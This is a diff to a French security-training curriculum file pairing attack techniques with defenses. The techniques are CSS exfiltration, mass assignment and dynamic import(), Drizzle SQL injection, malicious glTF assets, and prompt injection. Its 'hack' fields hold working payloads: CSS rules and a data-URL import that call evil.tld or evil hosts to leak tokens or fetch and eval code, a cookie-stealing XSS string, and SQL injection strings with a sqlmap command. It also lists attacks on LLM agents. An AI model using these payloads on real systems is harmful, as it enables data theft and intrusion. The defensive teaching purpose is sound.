+    antiHack: "1. **JAMAIS `pickle.loads` sur des données non-trustées.** Pickle est non-sécurisable par conception. Pour de l'échange de données : **JSON** (`json.loads`) + validation de schéma (Pydantic). Pour des objets typés : msgpack/protobuf, jamais pickle exposé au réseau.\n2. **YAML : toujours `yaml.safe_load(...)`** (ou `Loader=SafeLoader`). Bannir `yaml.load` sans loader, `FullLoader`, `UnsafeLoader`. Lint : règle Bandit `B506` (yaml_load) en CI.\n3. **Bannir `eval`/`exec` sur de l'input user — point.** Pour évaluer des expressions mathématiques : `ast.literal_eval` (ne gère que des littéraux, pas d'appels) ou une lib dédiée (`simpleeval`, `asteval`) avec namespace restreint. `literal_eval` ne suffit PAS si tu as besoin d'opérations — utilise un vrai parseur.\n4. **Si un format binaire signé est indispensable** : signer le blob avec **HMAC** (`hmac.compare_digest`) et vérifier la signature AVANT de désérialiser. Mais cela ne protège que de la falsification, pas d'une clé fuitée — préférer JSON.\n5. **Modèles ML** : charger avec `torch.load(..., weights_only=True)` (PyTorch ≥ 2.x) ou le format **safetensors** (pas de pickle du tout). Ne jamais charger un `.pkl`/`.pt`/`.h5` d'origine inconnue.\n6. **Défense en profondeur** : process Python non-root, FS read-only, egress réseau filtré (bloque le `curl evil.com` et le reverse shell), seccomp/AppArmor pour interdire `execve` au worker qui n'en a pas besoin.\n7. **Détection** : Bandit (`B301` pickle, `B506` yaml, `B307` eval) + Semgrep en CI ; alerter sur tout `pickle.loads`/`yaml.load`/`eval`/`exec` dans une revue de code.",
+    ctfRef: "Root-Me — Python deserialization (pickle/YAML), TryHackMe Insecure Deserialization, HackTheBox \"baby website rick\" (pickle), picoCTF Python sandbox escapes",
+    cve: "CVE-2017-18342 (PyYAML yaml.load par défaut non sûr → safe_load forcé en 5.1), CVE-2020-1747 (PyYAML FullLoader contournable), CVE-2019-20477 (PyYAML), CVE-2022-1471 (SnakeYAML Java, même classe)",
+    // "Pickle Deserialization RCE" — démo forge __reduce__ + pickle.loads RCE
+    // "YAML: code execution using !!python/object" — PoC tag !!python/object
+    // "Talkie Pwnii #8: From Predictable Tokens to YAML Deserialization RCE in Python" (Pwnii / Intigriti)
+    youtubeIds: ["e3e3m5i5twE", "Za6czm2w5S8", "kSiuk2s-GpA"],
+  },
+
+  // ==================== M25 — IA appliquée ====================
   {
     slug: "prompt-injection",
-    moduleNumber: 24,
+    moduleNumber: 25,
     kind: "duo",
     language: "both",
     title: "Prompt Injection — Direct, Indirect, Multi-modal",
@@ -444,7 +539,7 @@ export const CODE_NOIR_TECHNIQUES: CodeNoirTechnique[] = [
     youtubeIds: ["FgxwCaL6UTA", "PLyEKcRn1Po"],
   },
 
-  // ==================== M25 — Agents/MCP ====================
+  // ==================== M25 — IA appliquée (agents / MCP) ====================
   {
     slug: "agent-attacks",
     youtubeSearch: "LLM agent tool injection prompt attack",
@@ -459,6 +554,59 @@ export const CODE_NOIR_TECHNIQUES: CodeNoirTechnique[] = [
     // "Multi-Chain Prompt Injection and Jailbreaking of LLM Applications"
     // "Prompt Injection / JailBreaking a Banking LLM Agent (GPT-4, Langchain)"
     youtubeIds: ["Xmond63yRWk", "5rXVg8cxne4"],
+  },
+
+  // ===== Jumeaux Code Noir générés (combler les modules sans technique) =====
+  {
+    slug: "css-injection-exfil",
+    moduleNumber: 7,
+    kind: "duo",
+    language: "concept",
+    title: "CSS Injection — exfiltration scriptless (sélecteurs récursifs, @import, ligatures)",
+    oneLiner: "Voler des secrets (tokens CSRF, texte caché) sans une ligne de JS, via du CSS injecté.",
+    hack: "Distinct du CSS keylogger (M06) : ici on **exfiltre du contenu déjà présent dans le DOM** (token CSRF dans un `value`, texte d'un nœud, attribut `href`) sans JavaScript. Vecteur typique : une appli qui te laisse injecter du CSS (thème custom, markdown avec `<style>`, sink HTML dans un contexte `<style>`).\n\n**1. Sélecteur d'attribut récursif — exfil char par char**\nLa cible : `<input name=\"csrf\" value=\"A7f...\">`. Le `value^=` matche un préfixe → chaque préfixe trouvé déclenche une requête.\n```css\ninput[name=\"csrf\"][value^=\"a\"] { background: url(https://evil.tld/leak?v=a); }\ninput[name=\"csrf\"][value^=\"b\"] { background: url(https://evil.tld/leak?v=b); }\n/* ... 0-9a-f pour un token hex */\n```\nTu reçois `?v=a` → 1er char = `a`. Mais le `value` ne change jamais : comment lire le **2e** char sans interaction ? → l'astuce `@import` récursif.\n\n**2. @import récursif (Blind CSS Exfiltration)**\nTon serveur sert une feuille de style dynamique. À chaque chargement, tu renvoies les sélecteurs pour le **char suivant**, puis tu re-`@import`-es ta propre URL. Le navigateur boucle et tu extrais le secret entier, caractère par caractère, sans JS.\n```css\n/* étape N servie par evil.tld : on connaît déjà \"a7\" */\ninput[value^=\"a7a\"] { background: url(https://evil.tld/leak?p=a7a); }\ninput[value^=\"a7b\"] { background: url(https://evil.tld/leak?p=a7b); }\n/* ... puis on relance la boucle */\n@import url(https://evil.tld/next.css);\n```\nLe serveur attend le `?p=...` reçu, fixe le préfixe connu, et sert l'étape suivante. C'est la technique de Gareth Heyes (PortSwigger) : fonctionne même sur une page inconnue, en aveugle.\n\n**3. Exfiltration d'un nœud de texte (pas juste un attribut)**\nLes sélecteurs d'attributs ne lisent pas le texte brut (`<div>secret</div>`). Deux contournements scriptless :\n- **`unicode-range`** : on charge une font custom par caractère ; si la page contient ce char, la font (donc une requête réseau via `src: url()`) se déclenche → on sait quels caractères sont présents (leak de l'ensemble, pas de l'ordre).\n```css\n@font-face { font-family: l1; src: url(https://evil.tld/has?c=a); unicode-range: U+61; }\n@font-face { font-family: l2; src: url(https://evil.tld/has?c=b); unicode-range: U+62; }\ndiv.secret { font-family: l1, l2, /* ... */ monospace; }\n```\n- **Ligatures + scroll/overflow leak** : on génère une font où la ligature du préfixe cible (`a7f`) est rendue ultra-large. Si le préfixe existe, le texte déborde son conteneur `overflow: scroll` → on cible la scrollbar avec un sélecteur conditionnel ou un `background` sur un élément voisin pour signaler le match. Combiné au `@import` récursif, on reconstruit l'**ordre** des caractères d'un nœud de texte. C'est le PoC ligatures + recursive @import de 2020.\n\n**Outils** : CSS-Exfil-Protection (étude), le PoC de Heyes (PortSwigger Research « Blind CSS Exfiltration »), labos PortSwigger CSS injection.",
+    antiHack: "1. **CSP stricte** : `style-src 'self'` (interdit les `<style>` inline et le CSS user-generated) + `img-src 'self'` + `font-src 'self'`. Cela coupe les `url()` vers `evil.tld`, les `@import` externes et les `@font-face` distantes — le cœur de toutes ces attaques.\n2. **Jamais de CSS user-controlled** dans la page : pas de sink HTML dans un contexte `<style>`, pas de thème/markdown qui laisse passer `<style>` ou des attributs `style`.\n3. **Si tu dois accepter du CSS custom** (CMS, thèmes) : sanitize avec une allowlist de propriétés, interdis `@import`, `url()` non-`data:`, `@font-face`, `unicode-range`, et les sélecteurs d'attributs.\n4. **Ne stocke pas de secrets dans le DOM** sous forme exploitable : token CSRF dans un cookie HttpOnly + header, pas dans un `<input value=\"...\">` lisible par `[value^=]`. Token usage unique (un leak partiel devient inutile après rotation).\n5. **`connect-src`/`default-src` restrictifs** pour bloquer toute fuite réseau résiduelle, et **Trusted Types** côté markup généré.\n6. **Référent contrôlé** : `Referrer-Policy: no-referrer` limite ce qui fuit via les requêtes d'images déclenchées.",
+    ctfRef: "PortSwigger Web Academy — CSS injection ; irisCTF 2023 « sanitizer » (XS-leak via ligatures de font) ; PortSwigger Research « Blind CSS Exfiltration » (Gareth Heyes)",
+    youtubeIds: ["3WjDnnmLlKo","b4SA6za-ooA","aQ6V2pdfgmg"],
+  },
+  {
+    slug: "unsafe-parsing-mass-assign",
+    moduleNumber: 10,
+    kind: "duo",
+    language: "js",
+    title: "Désérialisation & mass-assignment ES6+ — JSON.parse reviver, spread, import() dynamique",
+    oneLiner: "Parser ou recopier un objet user sans liste blanche : reviver piégé, spread qui écrase un champ sensible, import() d'une URL contrôlée.",
+    hack: "Trois mauvais réflexes ES6+ qui transforment un simple `req.body` en porte ouverte.\n\n**1. `JSON.parse(str, reviver)` — le reviver qui exécute la logique attaquant**\n\nLe 2e argument de `JSON.parse` est appelé pour CHAQUE clé, y compris `__proto__`, dans un ordre contrôlé par l'attaquant (les clés sont visitées bottom-up). Un reviver \"malin\" qui re-mappe ou transforme les valeurs devient un gadget.\n\n```js\n// Reviver censé \"normaliser\" les dates et caster les nombres\nconst data = JSON.parse(req.body.raw, (key, value) => {\n  if (key === 'amount') return Number(value);          // BUG: confiance aveugle\n  if (typeof value === 'string' && value.startsWith('$ref:')) {\n    return globalThis[value.slice(5)];                  // BUG: déréférence arbitraire\n  }\n  return value;\n});\n```\nPayload : `{\"role\":\"$ref:process\",\"amount\":\"-0\"}` → le reviver remonte `globalThis.process` dans l'objet, l'attaquant accède à `data.role.env`, `data.role.mainModule`, etc.\n\nMême sans `globalThis`, le reviver est exécuté AVANT toute validation, donc tout side-effect (log, mutation d'un état partagé, accès DB) tourne sur de la donnée non validée. Et `JSON.parse('{\"__proto__\":{\"isAdmin\":true}}')` crée déjà une clé `__proto__` *propre* (own, non-énumérée pour l'héritage) que ton reviver peut propager dans un merge en aval.\n\n**2. Mass-assignment via spread / `Object.assign` / destructuring**\n\nLe sucre ES6 rend la copie d'objet triviale… et donc l'écrasement de champs sensibles trivial.\n\n```js\n// Update profil — \"on garde l'existant et on applique les changements\"\nasync function updateProfile(req) {\n  const current = await db.users.findById(req.user.id);\n  const next = { ...current, ...req.body };   // BUG: req.body écrase TOUT\n  await db.users.update(req.user.id, next);\n}\n```\nPayload : `{\"displayName\":\"bob\",\"role\":\"admin\",\"emailVerified\":true,\"credits\":999999}`\n→ le spread applique `role`, `emailVerified`, `credits` par-dessus l'objet DB. `Object.assign(current, req.body)` a exactement le même trou. Le destructuring large `const { ...rest } = req.body` puis `db.update(rest)` aussi.\n\nVariante : champs imbriqués. `{\"settings\":{\"__proto__\":{\"isAdmin\":true}}}` passé à un deep-merge maison → prototype pollution (voir technique dédiée M12, ici c'est le même vecteur d'entrée).\n\n**3. `import()` dynamique d'une URL/chemin contrôlé par l'attaquant**\n\nL'`import()` dynamique ES2020 accepte un specifier *runtime*. Si ce specifier vient de l'input, c'est du chargement de code arbitraire.\n\n```js\n// \"plugin loader\" — charge un module selon un nom fourni par l'API\napp.post('/run-plugin', async (req) => {\n  const mod = await import(req.body.plugin);   // BUG: specifier attaquant\n  return mod.default(req.body.args);\n});\n```\nPayloads :\n- `{\"plugin\":\"../../etc/cron.d/x\"}` → path traversal vers un fichier que l'attaquant a pu déposer ailleurs (upload, log poisoning).\n- `{\"plugin\":\"data:text/javascript,fetch('//evil/x').then(r=>r.text()).then(eval)\"}` → Node accepte `import()` d'une **data: URL** ⇒ exécution directe de JS attaquant.\n- `{\"plugin\":\"https://evil.com/payload.mjs\"}` → si `--experimental-network-imports` (ou un loader custom) est actif, Node fetch + exécute un module distant. C'est exactement le mécanisme abusé par les malwares de supply-chain (un package légitime `import()`-e dynamiquement un second stage distant pour échapper au scan statique).\n\nCôté front, c'est pire : `import(userUrl)` charge et exécute un ES module cross-origin avec un accès DOM complet (équivaut à une RCE navigateur).\n\n**Outils** : Burp (forger les body JSON), `node --inspect` pour voir le specifier résolu, `socket.dev`/`npm why` pour repérer un package qui fait du `import()` dynamique distant.",
+    antiHack: "1. **Ne jamais utiliser de reviver à logique sensible.** `JSON.parse(str)` sans 2e argument, PUIS validation par schéma (Zod). Si tu dois caster, fais-le dans le schéma (`z.coerce.number()`), pas dans un reviver. Refuse explicitement les clés dangereuses : `if (key === '__proto__' || key === 'constructor' || key === 'prototype') return undefined;` si un reviver est inévitable.\n\n2. **Liste blanche explicite contre le mass-assignment.** Jamais `{ ...current, ...req.body }` ni `Object.assign` avec de l'input brut. Construis l'objet champ par champ depuis un schéma `.strict()` :\n```ts\nconst ProfilePatch = z.object({\n  displayName: z.string().min(1).max(80),\n  bio: z.string().max(500).optional(),\n}).strict();                              // rejette role, credits, emailVerified...\nconst patch = ProfilePatch.parse(req.body);\nawait db.users.update(req.user.id, patch); // seuls les champs autorisés\n```\n`.strict()` fait échouer toute clé non listée — c'est la parade au mass-assignment et au `__proto__` imbriqué d'un coup.\n\n3. **`import()` dynamique : specifier jamais dérivé de l'input.** Mappe une valeur d'entrée vers un module via un dictionnaire codé en dur :\n```js\nconst PLUGINS = { invoice: () => import('./plugins/invoice.js'),\n                  export:  () => import('./plugins/export.js') };\nconst load = PLUGINS[req.body.plugin];      // clé connue uniquement\nif (!load) return reply.code(400).send();\nconst mod = await load();\n```\nAucune concaténation de chemin, aucune URL externe.\n\n4. **Désactiver les schemes dangereux pour les imports.** En Node, ne pas activer `--experimental-network-imports`; bloquer `data:`/`http(s):` via un loader/policy. Sur le front, CSP `script-src 'self'` empêche `import()` d'une origine non autorisée.\n\n5. **Limites & moindre privilège.** `bodyLimit` Fastify, `Object.create(null)` pour les maps qui reçoivent de l'input, process applicatif non-root, FS read-only. Logguer toute validation échouée (signal d'attaque).",
+    ctfRef: "PortSwigger — Exploiting a mass assignment vulnerability (API testing lab), crAPI API6:2023 Mass Assignment, OWASP API Security Top 10",
+    cve: "@solana/web3.js 1.95.6/1.95.7 (2024, second-stage chargé dynamiquement), event-stream (2018) — supply-chain via chargement de module non statique",
+    youtubeIds: ["D7m1wSoxRtY","LUsiFV3dsK8","pqflVQZ9N38"],
+  },
+  {
+    slug: "drizzle-sql-raw-injection",
+    moduleNumber: 19,
+    kind: "duo",
+    language: "js",
+    title: "Drizzle ORM — SQL injection via sql.raw() & requêtes non paramétrées",
+    oneLiner: "Contourner le query builder typé avec sql.raw() ou de la concaténation = SQLi malgré l'ORM.",
+    hack: "**Le faux sentiment de sécurité** : « j'utilise un ORM, je suis protégé contre la SQLi ». Faux dès que tu sors du query builder typé. Drizzle paramétrise **uniquement** quand tu passes par le template tag `sql\\`...\\`` (les `${}` deviennent des placeholders `$1, $2...`). `sql.raw()` injecte la string **telle quelle** dans la requête — aucun paramètre, aucun échappement.\n\n**Code vulnérable n°1 — sql.raw() avec input user** :\n```ts\nimport { sql } from 'drizzle-orm';\n\napp.get('/users', async (req) => {\n  const order = req.query.sort;          // ex: \"name\"\n  // BUG: sql.raw() colle la string brute dans le SQL\n  return db.execute(\n    sql.raw(`SELECT id, email FROM users ORDER BY ${order}`)\n  );\n});\n```\nPayload dans `sort` :\n```\nname; DROP TABLE sessions--\n1; SELECT * FROM pg_sleep(5)--          (time-based, confirme la faille)\n(CASE WHEN (SELECT current_setting('is_superuser'))='on' THEN id ELSE email END)\n```\nORDER BY est un point d'injection redoutable : on ne peut pas le paramétrer (un placeholder ne peut pas être un nom de colonne), donc les devs « bricolent » avec `sql.raw()` → jackpot.\n\n**Code vulnérable n°2 — concaténation dans le template tag** :\n```ts\nconst email = req.body.email;\n// BUG: la concaténation se fait AVANT le template tag → un seul gros literal\nawait db.execute(sql.raw('SELECT * FROM users WHERE email = \\'' + email + '\\''));\n```\nPayload classique d'auth bypass :\n```\n' OR '1'='1\n' UNION SELECT id, password_hash, role FROM users--\nadmin'--\n```\n\n**Code vulnérable n°3 — `sql.raw()` imbriqué dans un `sql\\`\\``** :\n```ts\nconst col = req.query.field;\n// Le template tag est safe... sauf que sql.raw() rouvre la porte\nawait db.execute(sql`SELECT ${sql.raw(col)} FROM products WHERE id = ${id}`);\n// id est paramétré ($1), mais col est injecté brut → SQLi sur le SELECT\n```\nPayload dans `field` :\n```\n(SELECT password_hash FROM users WHERE role='admin' LIMIT 1)\n```\n\n**Code vulnérable n°4 — clause LIMIT/colonne dynamique via .orderBy()** :\n```ts\n// orderBy accepte du sql brut\nawait db.select().from(users).orderBy(sql.raw(req.query.sort));\n```\n\n**Détection** : ajoute un `'` à n'importe quel paramètre qui finit dans un `sql.raw()`. Erreur Postgres `syntax error at or near` = vulnérable. Sinon test time-based : `1; SELECT pg_sleep(5)--` → si la réponse met 5s, c'est gagné.\n\n**Exploitation/outils** : `sqlmap -u '...?sort=name' --dbms=postgresql --technique=BT` (boolean + time-based, car ORDER BY n'expose pas d'UNION facile). Grep du codebase pour trouver les points chauds :\n```bash\ngrep -rn 'sql.raw\\|\\.execute(\\|\\${.*req\\.' src/\n```",
+    antiHack: "1. **Règle d'or** : `sql.raw()` ne doit JAMAIS recevoir d'input utilisateur, ni directement ni concaténé. Réserve-le aux fragments 100% statiques (constantes du code).\n2. **Utilise le template tag** `sql\\`...\\`` pour toute valeur : `sql\\`SELECT * FROM users WHERE email = ${email}\\`` → Drizzle génère `$1` et passe `email` comme paramètre lié (échappement délégué au driver pg). C'est la défense centrale.\n3. **Colonnes/tri dynamiques = allowlist, jamais raw input** :\n```ts\nconst COLUMNS = { name: users.name, email: users.email, createdAt: users.createdAt } as const;\nconst col = COLUMNS[req.query.sort as keyof typeof COLUMNS] ?? users.createdAt;\nconst dir = req.query.dir === 'desc' ? desc : asc;\nawait db.select().from(users).orderBy(dir(col));   // référence de colonne typée, pas une string\n```\n4. **Privilégie le query builder typé** (`db.select()`, `eq()`, `and()`, `inArray()`) : il paramétrise par construction. Descendre au `sql` brut doit être l'exception justifiée, pas la norme.\n5. **Valide le type à la frontière (Zod)** avant le query : `z.enum(['name','email','createdAt'])` pour un sort, `z.coerce.number().int()` ou `z.string().uuid()` pour un id. Un input contraint à un enum ne peut pas porter de payload.\n6. **Lint/CI** : interdis `sql.raw(` via une règle ESLint `no-restricted-syntax` ou un `grep` bloquant en CI, avec exemption explicite et commentée au cas par cas.\n7. **Moindre privilège DB** : l'utilisateur applicatif Postgres ne doit pas être superuser ni avoir `DROP`/`DDL`. Limite le rayon de souffle si une SQLi passe quand même.",
+    ctfRef: "PortSwigger — SQL injection (16 labs, dont SQLi dans la clause ORDER BY), PayloadsAllTheThings — SQL Injection",
+    cve: "CWE-89 (SQL Injection). Cf. CVE-2022-31197 (PostgreSQL JDBC ResultSet — classe SQLi sur colonne non paramétrée)",
+    youtubeIds: ["99Yit7WitxY","2eC8-9EnBPE","goHMu2hMNms"],
+  },
+  {
+    slug: "three-js-malicious-assets",
+    moduleNumber: 23,
+    kind: "duo",
+    language: "js",
+    title: "Three.js / R3F — Assets 3D malveillants (XSS via glTF, bombes Draco, DoS GPU WebGL)",
+    oneLiner: "Un .gltf/.glb uploadé par un user devient un vecteur : XSS via champs texte, bombe de décompression Draco, ou épuisement GPU qui fige l'onglet.",
+    hack: "Un viewer 3D (galerie d'avatars, configurateur produit, marketplace d'assets) qui charge des modèles **fournis par l'utilisateur** traite un format binaire complexe comme une donnée de confiance. Trois classes d'attaque.\n\n**1. XSS via les champs texte du glTF**\n\nLe glTF est un JSON. Plein de champs string (`name`, `extras`, `asset.generator`, noms de matériaux/nodes) sont souvent **réinjectés tels quels dans le DOM** par les UI de viewer (panneau \"objets de la scène\", tooltips, légendes).\n```js\n// Code vulnérable : on liste les meshes dans une sidebar\nloader.load(url, (gltf) => {\n  gltf.scene.traverse((obj) => {\n    // BUG : obj.name vient direct du fichier, injecté en innerHTML\n    sidebar.innerHTML += `<li>${obj.name}</li>`;\n  });\n});\n```\nLe `.gltf` malveillant :\n```json\n{\n  \"nodes\": [\n    { \"name\": \"<img src=x onerror=fetch('//evil/'+document.cookie)>\" }\n  ],\n  \"asset\": { \"version\": \"2.0\", \"generator\": \"<svg onload=alert(1)>\" }\n}\n```\nVariante R3F/`gltfjsx` : l'outil génère du JSX à partir des noms de nodes. Un nom piégé peut casser le template ou, si tu rends `userData`/`name` via `dangerouslySetInnerHTML` dans un panneau d'inspection, exécuter du JS.\n\nAutre surface : les **URI de textures/buffers** en `data:` ou en URL externe. Un glTF avec `images[].uri = \"javascript:...\"` ou pointant vers un domaine attaquant permet du tracking + exfiltration (et `file://` côté Electron/desktop = lecture disque).\n\n**2. Bombe de décompression — Draco / KTX2 / .glb gzip**\n\nDraco compresse la géométrie. Comme tout codec à ratio élevé, il se prête à la **bombe de décompression** : quelques Ko sur le fil → des centaines de Mo / Go de buffers de géométrie décodés en RAM → OOM de l'onglet, voire du device mobile.\n```js\n// Pas de garde-fou : on décode tout ce qui arrive\nconst loader = new GLTFLoader();\nloader.setDRACOLoader(new DRACOLoader());\nloader.load(userUploadedUrl, onLoad); // décode N millions de vertices sans limite\n```\nLe principe est identique au zip bomb (ratio 1000×+, cf. bzip2 → 1 400 000×) appliqué à la géométrie : un header annonce un nombre de vertices/indices énorme, le décodeur alloue. Couches cumulables : `.glb` → gzip HTTP → buffer Draco → ça multiplie les ratios. Côté KTX2/Basis, une texture annonçant `16384×16384` en plusieurs layers explose la VRAM.\n\n**3. Épuisement GPU (DoS WebGL)**\n\nPas besoin de bug : le rendu 3D consomme du GPU, et **une tâche GPU n'est pas préemptible**. Un asset conçu pour ça fige l'onglet (et parfois tout le compositeur du système).\n- **Sur-tessellation** : un mesh à dizaines de millions de triangles → le draw call sature le GPU, framerate à 0, \"Aw, Snap\".\n- **Bombe de draw calls** : des milliers de nodes/primitives distincts → CPU et GPU noyés par les changements d'état.\n- **Shader malveillant** (si l'app accepte des matériaux custom / `ShaderMaterial` user-controlled) : une boucle quasi-infinie dans un fragment shader monopolise le GPU. `gl.compileShader` accepte du code arbitraire ; ANGLE/le watchdog peuvent reset le contexte (`WEBGL_lose_context`) mais après un gros lag.\n```glsl\n// fragment shader hostile fourni par l'attaquant\nvoid main() {\n  float x = 0.0;\n  for (int i = 0; i < 100000; i++) { x += sin(cos(x)) * 0.0001; }\n  gl_FragColor = vec4(x);\n}\n```\n- **Fuite de contexte** : créer/détruire des `WebGLRenderer` en boucle dépasse la limite de contextes WebGL du navigateur → les autres canvases de la page meurent.\n\n**Outils / PoC** : `gltf-transform inspect` (lire ce qu'annonce un fichier), `gltfjsx` (voir la génération JSX), Spector.js (inspecter les draw calls/état GL), Chrome `chrome://gpu`, un simple éditeur de texte pour forger un `.gltf` piégé.",
+    antiHack: "1. **Jamais d'innerHTML avec les métadonnées d'un asset** : afficher `obj.name`, `asset.generator`, `extras`, noms de matériaux via `textContent` uniquement (ou `{name}` en JSX, qui échappe). Si du HTML est requis, passer par DOMPurify.\n2. **Sanitize le glTF avant chargement** : valider le JSON contre un schéma, **rejeter/normaliser tous les `uri`** — autoriser seulement `data:` (types image attendus) et un allowlist d'hôtes ; bannir `javascript:`, `file://`, et toute URL externe non prévue. `gltf-transform` peut nettoyer/réécrire le fichier serveur-side.\n3. **Bornes anti-bombe AVANT décodage** : limite stricte de taille de fichier, et inspection des headers (`gltf-transform inspect`) pour **plafonner vertices/indices/draw calls/résolution de texture** avant d'appeler le DRACOLoader. Refuser au-delà du seuil (ex. 500k vertices, 4096² textures).\n4. **Décoder dans un Web Worker** avec budget mémoire/temps : si le décodage dépasse un timeout ou un quota, le tuer (`worker.terminate()`) sans figer le thread principal. Draco/KTX2 loaders supportent les workers — c'est aussi une barrière DoS.\n5. **Cap GPU explicite** : limiter triangles rendus, nombre de draw calls, et `renderer.info` surveillé en runtime ; downscale ou refuser les scènes trop lourdes. Désactiver l'affichage si `renderer.info.render.triangles` dépasse un seuil.\n6. **Jamais de `ShaderMaterial`/GLSL user-controlled** : pas de shader fourni par l'utilisateur. Si shaders custom nécessaires, allowlist de shaders signés/revus uniquement.\n7. **Réutiliser UN seul WebGLRenderer** (singleton) au lieu d'en instancier par asset → évite l'épuisement de contextes. Gérer `webglcontextlost`/`restored` proprement.\n8. **Pipeline serveur-side** : re-transcoder tous les uploads via `gltf-transform` (re-compression Draco maîtrisée, strip des `extras`/`extensions` inconnues, normalisation des URIs) avant de servir l'asset. Servir depuis un domaine/CDN isolé (sandbox d'origine).\n9. **CSP** : `img-src` et `connect-src` restreints pour neutraliser l'exfiltration via textures `data:`/URLs externes et les `onerror` qui fetchent.",
+    ctfRef: "OWASP — Uncontrolled Resource Consumption (CWE-400) & Decompression Bomb (CWE-409) ; recherche \"The Risks of WebGL: Analysis, Evaluation and Detection\" (analyse DoS GPU via shaders/ANGLE)",
+    cve: "Classe CWE-400 / CWE-409 (resource exhaustion / decompression bomb) + CWE-79 (XSS) — pas de CVE three.js unique ; voir advisories DRACO/draco-loader sur consommation mémoire",
+    youtubeIds: ["lhftxg7dppo","elN6kTLGDQo","1ds-Q04TD98"],
   },
 ];
 
